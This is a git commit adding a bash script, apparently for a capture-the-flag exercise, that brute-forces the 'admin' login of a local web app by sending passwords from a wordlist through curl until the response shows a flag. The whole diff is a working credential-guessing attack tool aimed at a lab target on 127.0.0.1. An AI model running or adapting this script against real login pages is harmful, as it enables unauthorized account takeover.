aa607229f5bc58f7c1d4354358e4109d508081d7
killian <killianscordel@gmail.com>
2025-01-29 23:35:28 +0100

    Ajout du scripte brute force login

--- brute_force_login/Ressources/login.sh
+++ brute_force_login/Ressources/login.sh
@@ -1,18 +1,17 @@
 #!/bin/bash
 
 URL="http://127.0.0.1:8080/index.php?page=signin"
-
-PASSWORD_LIST="passwords.txt"
-
-LOG_FILE="login_attempts.log"
-
 USERNAME="admin"
+PASSWORD_FILE="pass.txt"
 
+# Lire chaque mot de passe dans pass.txt et tester
 while read -r PASSWORD; do
     echo "Trying password: $PASSWORD"
-	RESPONSE=$(curl -s -X POST -d "username=$USERNAME&password=$PASSWORD" "$URL")
-	echo "Password: $PASSWORD" >> "$LOG_FILE"
-    echo "Response:" >> "$LOG_FILE"
-    echo "$RESPONSE" >> "$LOG_FILE"
-    echo "----------------------------------------" >> "$LOG_FILE"
-done < "$PASSWORD_LIST"
+    RESPONSE=$(curl -s -X POST "http://127.0.0.1:8080/index.php?page=signin&username=$USERNAME&password=$PASSWORD&Login=Login")
+    
+    if echo "$RESPONSE" | grep -q 'flag'; then
+        echo "Flag found with password: $PASSWORD"
+        echo "$RESPONSE" | grep 'flag'
+        break
+    fi
+done < "$PASSWORD_FILE"
